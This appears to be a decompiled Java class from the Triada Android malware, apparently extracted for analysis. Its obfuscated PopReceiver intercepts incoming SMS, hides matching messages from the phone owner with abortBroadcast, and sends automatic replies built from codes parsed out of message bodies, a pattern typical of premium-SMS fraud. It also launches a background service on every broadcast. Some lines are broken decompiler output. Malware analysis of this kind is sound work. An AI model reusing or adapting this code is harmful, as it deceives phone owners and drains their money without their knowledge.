package com.android.jservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import com.a.a.a.b;
import com.a.a.a.c;
import com.a.a.a.d;
import com.a.a.c.a;
import com.a.a.c.c;
import java.util.Random;

public class PopReceiver extends BroadcastReceiver {
  private void a(Context paramContext, Intent paramIntent) {
    Object[] arrayOfObject = (Object[])paramIntent.getExtras().get(b.O);
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
    for (byte b = 0;; b++) {
      if (b >= arrayOfObject.length)
        return; 
      arrayOfSmsMessage[b] = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
      String str1 = arrayOfSmsMessage[b].getOriginatingAddress();
      String str2 = arrayOfSmsMessage[b].getMessageBody();
      a a2 = new a();
      a2.b = c.c(str2);
      a2.a = str1;
      if (c.a(paramContext, a2) != null)
        abortBroadcast(); 
      a a1 = c.b(paramContext, a2);
      if (a1 != null) {
        if (a1.d == 1) {
          if (a2.b.contains(a1.e))
            c.a(paramContext, a2.a, String.valueOf((new Random()).nextInt(d.a)) + d.b, d.b); 
        } else {
          String str;
          if (a1.d == 2) {
            str = c.c(a1.e);
            str2 = d.b;
            String[] arrayOfString = str.split(b.L);
            int i = Integer.parseInt(arrayOfString[0]);
            if (Integer.parseInt(arrayOfString[0]) < 10) {
              str = str2;
              if (a2.b.contains(arrayOfString[1]))
                str = a2.b.substring(i, a2.b.indexOf(arrayOfString[1])); 
            } else {
              str = str2;
              if (a2.b.contains(arrayOfString[2])) {
                str = str2;
                if (a2.b.contains(arrayOfString[1])) {
                  String[] arrayOfString1 = a2.b.split(arrayOfString[1]);
                  if (arrayOfString1[1].contains(arrayOfString[2])) {
                    i = arrayOfString1[1].indexOf(arrayOfString[2]);
                    if (i >= 0) {
                      str = arrayOfString1[1].substring(0, i);
                    } else {
                      str = str[1];
                    } 
                  } else {
                    str = str[1];
                  } 
                } 
              } 
            } 
            c.a(paramContext, a2.a, str, d.b);
          } else if (((a)str).d == 3) {
            String[] arrayOfString = ((a)str).e.split(b.L);
            if (a2.b.contains(arrayOfString[1]))
              c.a(paramContext, a2.a, arrayOfString[0], d.b); 
          } 
        } 
        abortBroadcast();
      } 
    } 
  }
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    paramContext.startService(new Intent(paramContext, UpdateService.class));
    if (paramIntent.getAction().equals(b.ar))
      a(paramContext, paramIntent); 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/jservice/PopReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */